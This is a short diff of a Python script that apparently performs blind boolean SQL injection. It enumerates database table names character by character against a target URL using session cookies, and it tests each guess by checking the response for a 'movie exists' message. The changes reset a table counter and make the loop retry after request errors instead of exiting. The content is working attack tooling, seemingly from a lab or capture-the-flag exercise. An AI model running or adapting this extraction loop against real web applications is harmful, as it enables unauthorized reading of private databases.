@@ -6,7 +6,7 @@ import requests
 def GetTables(urlTarget, cookies, databaseName):
   tables = []
   tempTable = ""
-  cntTables = 5
+  cntTables = 0
   checkEof = 0
 
   while(True):
@@ -26,14 +26,18 @@ def GetTables(urlTarget, cookies, databaseName):
           }
 
           r = requests.get(urlTarget, params=paramsTarget, cookies=cookies)
-
+          #print(j)
+        
         except Exception as e:
           print(e)
           print("Error...")
+          j = j - 1;
+          continue;
           exit(1)
 
         if 'The movie exists in our database!' in r.text:
           tempTable += chr(j)
+          
           break
         
         if (j == 127):
